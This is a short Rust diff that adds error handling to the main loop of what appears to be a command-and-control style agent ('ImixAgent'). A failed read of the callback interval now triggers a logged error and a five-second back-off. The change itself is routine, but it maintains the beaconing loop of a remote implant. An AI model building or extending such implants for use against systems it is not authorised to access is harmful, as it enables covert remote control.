@@ -40,7 +40,12 @@ pub async fn run_agent() -> Result<()> {
             break;
         }
 
-        sleep_until_next_cycle(&agent, start).await;
+        if let Err(e) = sleep_until_next_cycle(&agent, start).await {
+            #[cfg(debug_assertions)]
+            log::error!("Failed to sleep: {e:#}");
+            // Prevent tight loop on config read failure
+            tokio::time::sleep(Duration::from_secs(5)).await;
+        }
     }
 
     #[cfg(debug_assertions)]
@@ -114,8 +119,8 @@ async fn process_tasks(agent: &ImixAgent<ActiveTransport>, registry: &TaskRegist
     }
 }
 
-async fn sleep_until_next_cycle(agent: &ImixAgent<ActiveTransport>, start: Instant) {
-    let interval = agent.get_callback_interval_u64();
+async fn sleep_until_next_cycle(agent: &ImixAgent<ActiveTransport>, start: Instant) -> Result<()> {
+    let interval = agent.get_callback_interval_u64()?;
     let delay = match interval.checked_sub(start.elapsed().as_secs()) {
         Some(secs) => Duration::from_secs(secs),
         None => Duration::from_secs(0),
@@ -127,4 +132,5 @@ async fn sleep_until_next_cycle(agent: &ImixAgent<ActiveTransport>, start: Insta
         delay.as_secs()
     );
     tokio::time::sleep(delay).await;
+    Ok(())
 }
